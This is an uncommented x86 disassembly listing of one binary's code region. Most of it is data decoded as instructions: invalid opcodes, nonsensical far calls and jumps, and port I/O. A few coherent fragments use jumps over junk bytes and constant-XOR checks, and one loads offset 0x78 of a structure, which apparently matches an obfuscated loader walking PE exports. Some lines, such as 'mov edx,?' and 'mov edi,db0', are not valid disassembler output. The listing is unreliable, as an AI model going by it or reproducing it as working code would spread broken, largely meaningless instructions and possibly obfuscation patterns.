  40a6e6:	call   0xc63bbebc
  40a6eb:	adc    ebp,esi
  40a6ed:	adc    esi,DWORD PTR [ebx+edx*8-0x7667af67]
  40a6f4:	push   edx
  40a6f5:	minps  xmm7,XMMWORD PTR [ebx]
  40a6f8:	cwde   
  40a6f9:	loop   0x40a76f
  40a6fb:	fisttp DWORD PTR [edi-0x4f]
  40a6fe:	sub    eax,0xb23ce8e9
  40a703:	xchg   edx,eax
  40a704:	pop    ebx
  40a705:	xor    DWORD PTR [edx+0x41],edi
  40a708:	or     BYTE PTR [ebx-0x5c],cl
  40a70b:	dec    ebp
  40a70c:	pop    edi
  40a70d:	or     DWORD PTR [edi],0x59
  40a710:	retf   
  40a711:	xchg   esp,eax
  40a712:	shl    ch,cl
  40a714:	sub    al,0xf9
  40a716:	cmp    WORD PTR [eax],bp
  40a719:	(bad)  
  40a71a:	and    al,0xe7
  40a71c:	xchg   edi,eax
  40a71d:	test   al,0x59
  40a71f:	and    edi,DWORD PTR [edi+0x25]
  40a722:	jle    0x40a71a
  40a724:	fidivr DWORD PTR ds:[eax]
  40a727:	loop   0x40a6d2
  40a729:	mov    eax,edx
  40a72b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a72c:	es cmp eax,0xc724b530
  40a732:	mov    cl,0x14
  40a734:	mov    gs,WORD PTR [ebx+0x51]
  40a737:	shr    DWORD PTR [ecx-0x523e4154],1
  40a73d:	jg     0x40a7a6
  40a73f:	rcl    BYTE PTR [edi],0xa1
  40a742:	jnp    0x40a7bd
  40a744:	data16 jp 0x40a6cf
  40a747:	test   dh,cl
  40a749:	iret   
  40a74a:	nop
  40a74b:	out    0x79,al
  40a74d:	scas   eax,DWORD PTR es:[edi]
  40a74e:	pop    ecx
  40a74f:	xchg   edx,eax
  40a750:	jne    0x40a7aa
  40a752:	(bad)  
  40a753:	jo     0x40a788
  40a755:	stc    
  40a756:	and    eax,0x36755386
  40a75b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a75c:	pop    eax
  40a75d:	jns    0x40a750
  40a75f:	pop    ds
  40a760:	(bad)  
  40a761:	leave  
  40a762:	adc    eax,0x54199bff
  40a767:	jmp    0x40a77e
  40a769:	scas   al,BYTE PTR es:[edi]
  40a76a:	dec    edi
  40a76b:	and    eax,0x497e4e3e
  40a770:	rcl    DWORD PTR [edx+0x3eeb6d96],0x2d
  40a777:	push   ss
  40a778:	sub    eax,0x3618f3c
  40a77d:	data16 cli 
  40a77f:	mov    ecx,0x8325dbfd
  40a784:	fs push edx
  40a786:	scas   eax,DWORD PTR es:[edi]
  40a787:	sbb    dl,ah
  40a789:	cmp    BYTE PTR [esp+ebx*4+0x7f9b2b90],al
  40a790:	ins    DWORD PTR es:[edi],dx
  40a791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a792:	jg     0x40a77e
  40a794:	or     al,0xa2
  40a796:	loope  0x40a7e0
  40a798:	out    0x62,al
  40a79a:	stos   DWORD PTR es:[edi],eax
  40a79b:	mov    ebx,0x4d73bcb2
  40a7a0:	cmp    eax,0x729d05a1
  40a7a5:	xor    al,BYTE PTR [eax]
  40a7a7:	leave  
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43059e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43059e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43059e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43059e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43059e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ecd0
  40a7f1:	cmp    DWORD PTR ds:0x43059e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43059e
  40a803:	inc    eax
  40a804:	mov    ds:0x43059e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x4305d2
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x4305d6
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a8ba
  40a840:	sti    
  40a841:	je     0x40a845
  40a843:	adc    eax,0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a869
  40a84c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a84d:	fadd   QWORD PTR [ebx]
  40a84f:	inc    ebx
  40a850:	jo     0x40a847
  40a852:	es call 0x44bf16d3
  40a858:	add    DWORD PTR [esi-0x5a6969ad],ebp
  40a85e:	xlat   BYTE PTR ds:[ebx]
  40a85f:	adc    DWORD PTR [ebp+0x76],edi
  40a862:	js     0x40a8c3
  40a864:	arpl   bx,cx
  40a866:	loop   0x40a894
  40a868:	aad    0x22
  40a86a:	sub    BYTE PTR [edx+esi*4],bl
  40a86d:	push   es
  40a86e:	jecxz  0x40a8ee
  40a870:	call   0xfcef:0xa5c3a4a6
  40a877:	mov    ss,ebx
  40a879:	push   ebp
  40a87a:	or     BYTE PTR [edx+eax*4-0x8],al
  40a87e:	hlt    
  40a87f:	sub    eax,edi
  40a881:	fild   QWORD PTR [ecx+ebx*8+0x4fc9538]
  40a888:	jmp    0xec22:0x34c764f8
  40a88f:	stos   BYTE PTR es:[edi],al
  40a890:	adc    ah,BYTE PTR [edi-0x73]
  40a893:	add    al,0x8c
  40a895:	mov    edx,0xb60afffe
  40a89a:	cmp    BYTE PTR [edi+0x3f71821a],cl
  40a8a0:	call   0x62d5:0x58c8ec86
  40a8a7:	aas    
  40a8a8:	retf   0xae3e
  40a8ab:	inc    edx
  40a8ac:	sbb    al,0x39
  40a8ae:	(bad)  
  40a8af:	bound  eax,QWORD PTR [edx+0x48]
  40a8b2:	hlt    
  40a8b3:	or     al,0xb1
  40a8b5:	aad    0xd0
  40a8b7:	fcmovnu st,st(5)
  40a8b9:	cmp    bl,BYTE PTR [eax-0x20ad939f]
  40a8bf:	mov    al,ds:0x821518c4
  40a8c4:	mov    ebp,ebx
  40a8c6:	mov    eax,0xbe27afcb
  40a8cb:	out    dx,eax
  40a8cc:	adc    DWORD PTR ds:0x6549c81,ecx
  40a8d2:	jae    0x40a8d9
  40a8d4:	iret   
  40a8d5:	sub    WORD PTR [ebx+0x70],cx
  40a8d9:	loop   0x40a896
  40a8db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8dc:	jl     0x40a876
  40a8de:	ds (bad) 
  40a8e0:	fld    TBYTE PTR [edi-0x67]
  40a8e3:	xor    al,0x91
  40a8e5:	xchg   DWORD PTR [eax],eax
  40a8e7:	add    BYTE PTR ds:[ecx],ah
  40a8ea:	xchg   BYTE PTR [edi+ebx*1],bl
  40a8ed:	std    
  40a8ee:	sub    al,0x5b
  40a8f0:	fdivr  QWORD PTR [esi+0x4efcbffa]
  40a8f6:	fidivr DWORD PTR [ebx+0x4f67ab5b]
  40a8fc:	fistp  QWORD PTR [ebx+ebp*1+0x3c]
  40a900:	mov    esi,0x3c7a5149
  40a905:	stc    
  40a906:	inc    esi
  40a907:	enter  0xb4b4,0xb5
  40a90b:	ja     0x40a924
  40a90d:	mov    edi,0xb95d6221
  40a913:	cs push ebp
  40a915:	(bad)  [eax]
  40a917:	and    DWORD PTR [ebx+0x7],edi
  40a91a:	call   0x805cb2b9
  40a91f:	aam    0xef
  40a921:	out    dx,eax
  40a922:	add    BYTE PTR [eax+eiz*8-0x198e27fb],bl
  40a929:	data16 mov cl,0x4d
  40a92c:	loop   0x40a8c2
  40a92e:	dec    edx
  40a92f:	cwde   
  40a930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a931:	jg     0x40a96c
  40a933:	call   0x488d:0x13baa147
  40a93a:	xchg   edx,eax
  40a93b:	leave  
  40a93c:	sub    edx,ebp
  40a93e:	pushf  
  40a93f:	xchg   edi,eax
  40a940:	mov    ebp,DWORD PTR [ebx+0x68]
  40a943:	repz aam 0x8d
  40a946:	and    dh,BYTE PTR [ecx]
  40a948:	and    DWORD PTR [ebx+0x68],esi
  40a94b:	clc    
  40a94c:	jbe    0x40a92a
  40a94e:	mov    cl,0x44
  40a950:	test   BYTE PTR [edi+0x2cfce782],cl
  40a956:	adc    BYTE PTR [eax-0x61],al
  40a959:	mov    ebp,DWORD PTR [edx-0x13]
  40a95c:	dec    ebx
  40a95d:	mov    DWORD PTR [ebp-0x40d838b0],esi
  40a963:	adc    BYTE PTR [ebp-0x42e43eb3],cl
  40a969:	jg     0x40a9dd
  40a96b:	fwait
  40a96c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a96d:	inc    edx
  40a96e:	adc    al,0x7
  40a970:	aaa    
  40a971:	pop    ecx
  40a972:	test   ebx,ebx
  40a974:	ja     0x40a909
  40a976:	push   esi
  40a977:	outs   dx,BYTE PTR ds:[esi]
  40a978:	shl    BYTE PTR [ebx-0x21],0x9a
  40a97c:	xchg   esp,eax
  40a97d:	es hlt 
  40a97f:	push   ebx
  40a980:	imul   ebx,esi,0xe85e94a9
  40a986:	dec    ecx
  40a987:	hlt    
  40a988:	pusha  
  40a989:	or     eax,DWORD PTR [eax]
  40a98b:	jmp    0x40a933
  40a98d:	xchg   ebx,eax
  40a98e:	not    DWORD PTR [esi-0x3c]
  40a991:	mov    dh,0xaa
  40a993:	ins    BYTE PTR es:[edi],dx
  40a994:	mov    ds:0xbd49d625,eax
  40a999:	(bad)  
  40a99a:	sbb    al,0x35
  40a99c:	(bad)  
  40a99d:	and    edi,DWORD PTR [edi+0x7d]
  40a9a0:	in     eax,dx
  40a9a1:	pop    ebx
  40a9a2:	in     al,0x7a
  40a9a4:	xor    DWORD PTR [ecx],edx
  40a9a6:	pop    ecx
  40a9a7:	cmp    ebx,eax
  40a9a9:	pop    edx
  40a9aa:	jno    0x40a962
  40a9ac:	mov    esp,0xda093d92
  40a9b1:	push   edi
  40a9b2:	and    edx,0x37
  40a9b5:	pushf  
  40a9b6:	mov    ebp,0xc9a9d3fa
  40a9bb:	retf   0xef6b
  40a9be:	and    edx,DWORD PTR [ecx+0x2d]
  40a9c1:	xor    al,0x86
  40a9c3:	pop    ebx
  40a9c4:	or     al,0x8
  40a9c6:	cmp    al,0xfd
  40a9c8:	dec    edi
  40a9c9:	cwde   
  40a9ca:	pop    ecx
  40a9cb:	iret   
  40a9cc:	(bad)  
  40a9cd:	fiadd  WORD PTR [ecx+0x4d]
  40a9d0:	adc    bh,al
  40a9d2:	xor    al,0xe8
  40a9d4:	and    edi,ebx
  40a9d6:	call   0xacfa:0x55164617
  40a9dd:	dec    eax
  40a9de:	mov    ecx,0x4743745b
  40a9e3:	ret    
  40a9e4:	or     dl,BYTE PTR [edx]
  40a9e6:	es push ecx
  40a9e8:	out    dx,al
  40a9e9:	mov    eax,ds:0xc5cfc8d0
  40a9ee:	pusha  
  40a9ef:	aam    0xa1
  40a9f1:	call   0xb2bbf02e
  40a9f6:	mov    dl,0x3
  40a9f8:	call   0x442bf96b
  40a9fd:	dec    edi
  40a9fe:	mov    esp,0x54d42aa
  40aa03:	les    ebx,FWORD PTR [esi-0xf3ba22a]
  40aa09:	lds    ebp,FWORD PTR [eax]
  40aa0b:	fnsave [ebx+0x7d38abcb]
  40aa11:	out    0xb1,al
  40aa13:	call   0x69c8:0x6f5e49ae
  40aa1a:	(bad)
  40aa1d:	div    BYTE PTR ds:0x749dec5c
  40aa23:	sub    cl,al
  40aa25:	lods   eax,DWORD PTR ds:[esi]
  40aa26:	aaa    
  40aa27:	or     ecx,DWORD PTR [ecx]
  40aa29:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40aa30:	or     edx,ecx
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e862,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x43065a,0x42e862
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e85a,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x430656,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	dec    ecx
  40aa9e:	jp     0x40aa4c
  40aaa0:	sub    DWORD PTR [ebx-0x13],esi
  40aaa3:	jle    0x40ab23
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40ab1e
  40aaaa:	sbb    BYTE PTR ds:0xefee6dda,ah
  40aab0:	cdq    
  40aab1:	sahf   
  40aab2:	dec    ebx
  40aab3:	or     BYTE PTR [esi+0x2d],bh
  40aab6:	nop
  40aab7:	or     al,0x4
  40aab9:	inc    esp
  40aaba:	inc    ecx
  40aabb:	nop
  40aabc:	mov    cl,0x79
  40aabe:	push   esi
  40aabf:	aaa    
  40aac0:	jge    0x40aac3
  40aac2:	mov    al,0xb5
  40aac4:	xchg   DWORD PTR ds:0x59c790ad,esp
  40aaca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aacb:	sbb    al,al
  40aacd:	and    DWORD PTR [edx-0x565ffdfa],edx
  40aad3:	retf   0xaf22
  40aad6:	push   esp
  40aad7:	int    0x1f
  40aad9:	xor    DWORD PTR [eax],0x4c6b18a6
  40aadf:	and    al,0x38
  40aae1:	ret    
  40aae2:	pop    edi
  40aae3:	ss in  al,dx
  40aae5:	mov    ds:0xc6fda71d,eax
  40aaea:	fsubr  DWORD PTR [edi+edx*4-0x3e]
  40aaee:	add    ecx,DWORD PTR [eax-0xa112a88]
  40aaf4:	call   0x4f36:0x34996bbd
  40aafb:	test   eax,0xbecd33b1
  40ab00:	push   cs
  40ab01:	out    0xf1,eax
  40ab03:	xor    al,0x8
  40ab05:	inc    ebp
  40ab06:	push   0xffffffee
  40ab08:	in     eax,dx
  40ab09:	sbb    eax,0x10395f6e
  40ab0e:	sbb    dh,BYTE PTR [ebp+ebx*1+0xa992481]
  40ab15:	cwde   
  40ab16:	test   al,0xd3
  40ab18:	scas   al,BYTE PTR es:[edi]
  40ab19:	aad    0x97
  40ab1b:	dec    edx
  40ab1c:	not    DWORD PTR [eax+0x5d9e53f1]
  40ab22:	cmp    DWORD PTR [eax+0x555035c2],ecx
  40ab28:	pop    es
  40ab29:	jns    0x40aae2
  40ab2b:	and    BYTE PTR [ebx],dl
  40ab2d:	fimul  WORD PTR [edx+0x7648f3b]
  40ab33:	mov    esi,0xd5dd133c
  40ab38:	mov    ebp,0xcbed3243
  40ab3d:	add    bh,BYTE PTR [edx-0x6ccac6cb]
  40ab43:	push   0x2c38ab98
  40ab48:	sbb    DWORD PTR [eax+0x65],edx
  40ab4b:	clc    
  40ab4c:	or     DWORD PTR [edx],0xffffffd1
  40ab4f:	dec    ecx
  40ab50:	(bad)  [edi+esi*8]
  40ab53:	inc    edi
  40ab54:	leave  
  40ab55:	mov    al,0xae
  40ab57:	xchg   edx,eax
  40ab58:	push   esp
  40ab59:	in     al,0xf5
  40ab5b:	sbb    ecx,DWORD PTR [ebp+0x703d97ec]
  40ab61:	fnsave fs:[edi+0x1c]
  40ab65:	je     0x40aaf8
  40ab67:	xor    al,al
  40ab69:	cmc    
  40ab6a:	dec    esp
  40ab6b:	add    DWORD PTR [edi-0x263dffe9],0xffffffc3
  40ab72:	lock xchg DWORD PTR [ebp-0x1bd6aae0],edx
  40ab79:	(bad)  
  40ab7a:	hlt    
  40ab7b:	imul   cx,WORD PTR [ecx-0x64],0x58
  40ab80:	imul   esp,DWORD PTR [ebp+ebx*8-0xf],0x57
  40ab85:	fwait
  40ab86:	add    al,0xfa
  40ab88:	call   0x3789:0x55822b6e
  40ab8f:	imul   ebp,edx,0x66f7758
  40ab95:	in     al,dx
  40ab96:	test   DWORD PTR [ebp+0xe],esp
  40ab99:	test   al,0xc0
  40ab9b:	push   esp
  40ab9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab9d:	hlt    
  40ab9e:	(bad)  
  40ab9f:	pop    eax
  40aba0:	sbb    BYTE PTR [ecx+0x3e],0x8a
  40aba4:	iret   
  40aba5:	movzx  ebx,WORD PTR [ecx-0x7c]
  40aba9:	bound  ebp,QWORD PTR ds:0x7afa6aed
  40abaf:	fisttp WORD PTR [ebx+ebx*1+0x683d39fe]
  40abb6:	fiadd  WORD PTR [ebx+0xe]
  40abb9:	mov    WORD PTR [esi+0x19643cff],gs
  40abbf:	jg     0x40abd8
  40abc1:	sbb    al,dh
  40abc3:	mov    dh,0x2d
  40abc5:	popf   
  40abc6:	leave  
  40abc7:	(bad)  
  40abc8:	nop
  40abc9:	cmp    BYTE PTR [esi+ebp*1],dl
  40abcc:	fwait
  40abcd:	pop    ebp
  40abce:	ins    DWORD PTR es:[edi],dx
  40abcf:	loope  0x40abd6
  40abd1:	xchg   edi,eax
  40abd2:	sbb    ecx,eax
  40abd4:	dec    esi
  40abd5:	push   esi
  40abd6:	repz push 0xa
  40abd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abda:	mov    ds:0x36fbcd75,al
  40abdf:	repz aaa 
  40abe1:	xor    cl,dh
  40abe3:	(bad)  
  40abe4:	cli    
  40abe5:	inc    ebx
  40abe6:	or     dh,dl
  40abe8:	imul   esi,DWORD PTR [esi+ecx*2-0x6f3cf985],0x61
  40abf0:	xor    DWORD PTR [ebp-0x4],eax
  40abf3:	dec    esp
  40abf4:	mov    WORD PTR [ecx+eax*4+0x429cd7f9],gs
  40abfb:	inc    esp
  40abfc:	int3   
  40abfd:	lock xor eax,0xb8f6da79
  40ac03:	push   ecx
  40ac04:	sbb    al,0x33
  40ac06:	sbb    cl,BYTE PTR fs:0x7c5d1542
  40ac0d:	mov    esi,0x6b31efd4
  40ac12:	inc    ebp
  40ac13:	sub    BYTE PTR [ebp+0x63869411],bh
  40ac19:	and    eax,DWORD PTR [esi-0x116b9f7a]
  40ac1f:	nop
  40ac20:	or     eax,0x7ad703c6
  40ac25:	call   0x40ffeb69
  40ac2a:	and    DWORD PTR [ebx+0x2d87f1e5],ebp
  40ac30:	into   
  40ac31:	sub    cl,0xc6
  40ac34:	das    
  40ac35:	inc    eax
  40ac36:	je     0x40ac5d
  40ac38:	out    dx,al
  40ac39:	pop    edx
  40ac3a:	add    al,ch
  40ac3c:	into   
  40ac3d:	inc    esi
  40ac3e:	lods   al,BYTE PTR ds:[esi]
  40ac3f:	fisub  DWORD PTR [edx-0x9]
  40ac42:	aaa    
  40ac43:	dec    esp
  40ac44:	not    BYTE PTR [eax-0x29]
  40ac47:	push   0xfffffff3
  40ac49:	cmp    esp,DWORD PTR [edx-0x1171424]
  40ac4f:	cmp    BYTE PTR [ecx-0x1ccc2798],bh
  40ac55:	sbb    ebp,ecx
  40ac57:	test   DWORD PTR ds:0x3f785ebb,ebp
  40ac5d:	call   0x9bac792
  40ac62:	stos   DWORD PTR es:[edi],eax
  40ac63:	mov    ds:0x82230537,eax
  40ac68:	sbb    BYTE PTR [eax-0x1f369c55],0xb8
  40ac6f:	retf   
  40ac70:	and    BYTE PTR [esp+edi*8-0x76521d15],ch
  40ac77:	fstp   TBYTE PTR [ebx-0x20]
  40ac7a:	or     ch,ah
  40ac7c:	dec    edx
  40ac7d:	xor    BYTE PTR [ebx+0x2aa650d9],0xf7
  40ac84:	dec    edi
  40ac85:	jg     0x40ac5d
  40ac87:	xor    eax,edx
  40ac89:	xor    esi,edx
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0xbde79d02
  40aca1:	rcl    DWORD PTR [ecx-0x12],1
  40aca4:	jle    0x40ad24
  40aca6:	pop    esp
  40aca7:	jg     0x40ad27
  40aca9:	jle    0x40ac38
  40acab:	jg     0x40ad12
  40acad:	out    0x40,eax
  40acaf:	and    ebp,DWORD PTR [ebp+esi*1+0x38]
  40acb3:	sub    ecx,DWORD PTR [eax+0x5d]
  40acb6:	dec    ecx
  40acb7:	xor    ebx,eax
  40acb9:	inc    ebx
  40acba:	add    al,0x5d
  40acbc:	test   BYTE PTR [eax-0x6b],bh
  40acbf:	cld    
  40acc0:	pop    ds
  40acc1:	pop    esp
  40acc2:	ds pop esp
  40acc4:	les    esp,FWORD PTR ds:0xb677e5e
  40acca:	lods   eax,DWORD PTR ds:[esi]
  40accb:	push   edi
  40accc:	lods   al,BYTE PTR ds:[esi]
  40accd:	dec    eax
  40acce:	test   DWORD PTR es:[ecx],ebx
  40acd1:	mov    edx,?
  40acd3:	xlat   BYTE PTR ds:[ebx]
  40acd4:	mov    al,BYTE PTR [ebp-0x454f8dd2]
  40acda:	ret    0xba6c
  40acdd:	(bad)  
  40acde:	call   0xbc2defa0
  40ace3:	push   cs
  40ace4:	cld    
  40ace5:	orps   xmm7,XMMWORD PTR [ebx-0x4d487f61]
  40acec:	mov    WORD PTR [eax-0x43918139],gs
  40acf2:	sar    DWORD PTR [edx-0x5e],0xe
  40acf6:	xor    bl,dh
  40acf8:	or     dh,BYTE PTR [eax-0x2b34a4f]
  40acfe:	std    
  40acff:	dec    esi
  40ad00:	scas   al,BYTE PTR es:[edi]
  40ad01:	add    edx,DWORD PTR ds:0x99261208
  40ad07:	or     al,0xe
  40ad09:	or     ch,BYTE PTR [eax]
  40ad0b:	mov    bh,BYTE PTR [ebx-0x1bdd3c3]
  40ad11:	pop    esi
  40ad12:	out    0x20,eax
  40ad14:	mov    eax,ds:0x58fd47b2
  40ad19:	(bad)  
  40ad1a:	mov    edi,0x1943eafb
  40ad1f:	fisub  DWORD PTR [edx+0x7a]
  40ad22:	popa   
  40ad23:	in     al,0xdb
  40ad25:	lods   al,BYTE PTR ds:[esi]
  40ad26:	inc    edx
  40ad27:	xlat   BYTE PTR ds:[ebx]
  40ad28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad29:	into   
  40ad2a:	xchg   ecx,eax
  40ad2b:	mov    edx,0x9c641435
  40ad30:	sbb    al,0xcc
  40ad32:	mov    esp,DWORD PTR [edi-0x48e338ae]
  40ad38:	xor    dl,BYTE PTR [ebx+0xb276e42]
  40ad3e:	sbb    DWORD PTR [ecx-0x21c22213],eax
  40ad44:	jg     0x40acde
  40ad46:	xor    eax,0x34aa5a12
  40ad4b:	jl     0x40acf7
  40ad4d:	xor    BYTE PTR [esi+eax*4+0x4d764963],bh
  40ad54:	stc    
  40ad55:	mov    esi,0xa6e6ae3
  40ad5a:	inc    ebx
  40ad5b:	or     ah,bh
  40ad5d:	mov    eax,ds:0x9166c005
  40ad62:	adc    dh,al
  40ad64:	xor    bh,BYTE PTR [edx+0x652ac9a7]
  40ad6a:	adc    DWORD PTR [ebx],ecx
  40ad6c:	and    DWORD PTR [ebp-0x42],eax
  40ad6f:	dec    esi
  40ad70:	push   0xffffffb1
  40ad72:	imul   esp,DWORD PTR [eax+0x47],0x9c96b45c
  40ad79:	push   ebp
  40ad7a:	ret    
  40ad7b:	dec    ecx
  40ad7c:	ins    DWORD PTR es:[edi],dx
  40ad7d:	outs   dx,BYTE PTR ds:[esi]
  40ad7e:	pop    ss
  40ad7f:	je     0x40ad87
  40ad81:	clc    
  40ad82:	lahf   
  40ad83:	push   edi
  40ad84:	sub    cl,BYTE PTR [esi]
  40ad86:	jno    0x40adab
  40ad88:	int    0xe1
  40ad8a:	les    esp,FWORD PTR [eax+0x3c]
  40ad8d:	jle    0x40ae00
  40ad8f:	pop    ss
  40ad90:	test   edi,ebp
  40ad92:	or     cl,BYTE PTR [ebp+0x1f6d2662]
  40ad98:	cdq    
  40ad99:	ins    DWORD PTR es:[edi],dx
  40ad9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad9c:	jmp    0xecb2b05b
  40ada1:	dec    edx
  40ada2:	pop    ecx
  40ada3:	pop    ds
  40ada4:	mov    BYTE PTR [eax+0x22],ah
  40ada7:	push   0xffffffae
  40ada9:	mov    esp,0xaef862a3
  40adae:	das    
  40adaf:	push   ds
  40adb0:	adc    BYTE PTR [edx],0xf0
  40adb3:	cmp    al,0x46
  40adb5:	lods   al,BYTE PTR ds:[esi]
  40adb6:	sub    eax,0x54d4dfee
  40adbb:	gs or  al,cl
  40adbe:	jmp    0x3686e77d
  40adc3:	sbb    al,0xb0
  40adc5:	mov    dl,0xc6
  40adc7:	add    BYTE PTR [edx-0x35a05a38],0xec
  40adce:	(bad)  
  40adcf:	mov    dl,0xa5
  40add1:	(bad)  
  40add2:	fcmovb st,st(6)
  40add4:	push   ebx
  40add5:	clc    
  40add6:	push   esp
  40add7:	mov    BYTE PTR [edx],ch
  40add9:	xor    BYTE PTR ds:0x71782756,0xcb
  40ade0:	(bad)  
  40ade1:	cmp    BYTE PTR ds:0xc73024d4,dl
  40ade7:	jge    0x40ad7c
  40ade9:	enter  0x8b19,0x23
  40aded:	mov    ds:0x7f066a7e,eax
  40adf2:	add    eax,DWORD PTR [ebx-0xb]
  40adf5:	jo     0x40adbe
  40adf7:	stos   DWORD PTR es:[edi],eax
  40adf8:	jecxz  0x40ae23
  40adfa:	cli    
  40adfb:	xchg   bh,cl
  40adfd:	fisub  DWORD PTR [esi+0x6c0b96da]
  40ae03:	cmp    dh,BYTE PTR [ecx+ebx*1]
  40ae06:	mov    ebp,DWORD PTR [ebx+0x43]
  40ae09:	sbb    BYTE PTR [eax],dl
  40ae0b:	inc    esi
  40ae0c:	push   ss
  40ae0d:	and    al,0x28
  40ae0f:	lods   eax,DWORD PTR ds:[esi]
  40ae10:	test   eax,0x5d23814b
  40ae15:	inc    edx
  40ae16:	call   0xfcdfa86f
  40ae1b:	lock lds ebx,FWORD PTR [esi]
  40ae1e:	add    eax,0xef0a108b
  40ae23:	cwde   
  40ae24:	out    dx,al
  40ae25:	aaa    
  40ae26:	mov    edi,db0
  40ae29:	pop    esp
  40ae2a:	out    0xc1,eax
  40ae2c:	cli    
  40ae2d:	and    al,0xe6
  40ae2f:	xor    bh,BYTE PTR [eax+0x3b]
  40ae32:	arpl   dx,cx
  40ae34:	and    al,0xe0
  40ae36:	call   0x2b125e3c
  40ae3b:	mov    ds:0xb7c4ca01,al
  40ae40:	pushf  
  40ae41:	inc    edx
  40ae42:	loope  0x40add5
  40ae44:	and    eax,0x7868ec04
  40ae49:	mov    ebp,0x7ca97cdd
  40ae4e:	sub    eax,0xecdc7141
  40ae53:	aaa    
  40ae54:	dec    esi
  40ae55:	or     al,0x82
  40ae57:	mov    edi,DWORD PTR ss:[edx-0x27b35398]
  40ae5e:	push   DWORD PTR [eax]
  40ae60:	mov    eax,0xd8b2aa8b
  40ae65:	pop    ebp
  40ae66:	hlt    
  40ae67:	or     BYTE PTR [ebp-0x62],0x4a
  40ae6b:	sub    eax,DWORD PTR [ebx-0x19]
  40ae6e:	mov    al,ds:0x85ba2795
  40ae73:	adc    al,BYTE PTR [eax+0x12fb4eba]
  40ae79:	mov    BYTE PTR [eax+0xe],bh
  40ae7c:	iret   
  40ae7d:	popa   
  40ae7e:	adc    DWORD PTR [eax+0x2],esp
  40ae81:	ret    0xb2f7
  40ae84:	mov    al,ds:0x31bb84a
  40ae89:	icebp  
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock ficomp WORD PTR [ebp+0x2f]
  40aeb5:	xor    BYTE PTR [edi+0x5c7e7ee0],bh
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40aea4
  40aebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aec0:	sti    
